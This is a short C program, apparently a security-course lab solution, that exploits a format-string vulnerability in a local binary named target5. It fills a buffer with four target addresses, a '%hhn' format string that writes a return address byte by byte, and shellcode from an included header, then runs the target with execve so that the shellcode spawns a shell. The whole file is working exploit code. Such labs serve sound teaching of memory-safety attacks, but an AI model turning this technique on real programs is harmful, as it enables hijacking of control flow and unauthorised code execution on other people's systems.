#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
	char *args[3];
	char *env[1];

	args[0] = TARGET;
	char exploit[256];
	int i;
	for (i = 0; i < 256; i++) {
		exploit[i] = 0x01;
	}
	int return_add = 0x2021f94b;
	int* ret_in_exploit = (int*) (exploit + 4);
	*ret_in_exploit = return_add;

	return_add = 0x2021f94a;
	ret_in_exploit = (int*) (exploit + 12);
	*ret_in_exploit = return_add;

	return_add = 0x2021f948;
	ret_in_exploit = (int*) (exploit + 20);
	*ret_in_exploit = return_add;
	
	return_add = 0x2021f949;
	ret_in_exploit = (int*) (exploit + 28);
	*ret_in_exploit = return_add;
	
	char format_string[31] = "%32d%hhn%1d%hhn%3d%hhn%214d%hhn";
	memcpy(exploit + 60, format_string, 31);
	memcpy(exploit + 196, shellcode, 45);	
	
	args[1] = exploit;
	args[2] = NULL;
	env[0] = NULL;
	//exploit[255] = '\0';
	for (i = 0; i < 256; i++) {
		printf("%c", exploit[i] & 0xff);
		fflush(stdout);
	}
	
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
